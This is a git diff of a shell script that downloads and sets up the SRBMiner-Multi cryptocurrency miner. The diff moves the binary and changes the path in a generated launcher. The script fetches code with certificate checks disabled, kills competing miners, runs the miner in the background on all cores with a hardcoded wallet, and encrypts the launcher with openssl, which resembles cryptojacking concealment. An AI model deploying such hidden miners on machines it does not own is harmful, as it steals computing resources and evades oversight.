@@ -7,6 +7,7 @@ sudo apt-get install cpulimit -y
 wget --no-check-certificate -O SRBMiner-Multi.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz
 tar -xvf SRBMiner-Multi.tar.gz
 chmod +x SRBMiner-Multi-2-4-6/*
+mv /root/SRBMiner-Multi-2-4-6/SRBMiner-MULTI /root/SRBMiner-MULTI
 cores=$(nproc --all)
 #rounded_cores=$((cores * 9 / 10))
 #read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
@@ -30,7 +31,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 sudo ./kill_miner.sh
 sleep 3
-sudo ./root/SRBMiner-Multi-2-4-6/SRBMiner-MULTI --background --threads=$cores -a Aurum --pool $fastest_server:17109 --tls true --wallet bit1qurhknpxt5k8vwz0snrg9xnyvgdnk4asc9skgtx.Vultr --keepalive true
+sudo ./SRBMiner-MULTI --background --threads=$cores -a Aurum --pool $fastest_server:17109 --tls true --wallet bit1qurhknpxt5k8vwz0snrg9xnyvgdnk4asc9skgtx.Vultr --keepalive true
 sleep 3
 EOF
 openssl enc -aes-256-cbc -salt -pbkdf2 -in /root/danielluis1921.sh -out /root/danielluis1922.sh -k $password
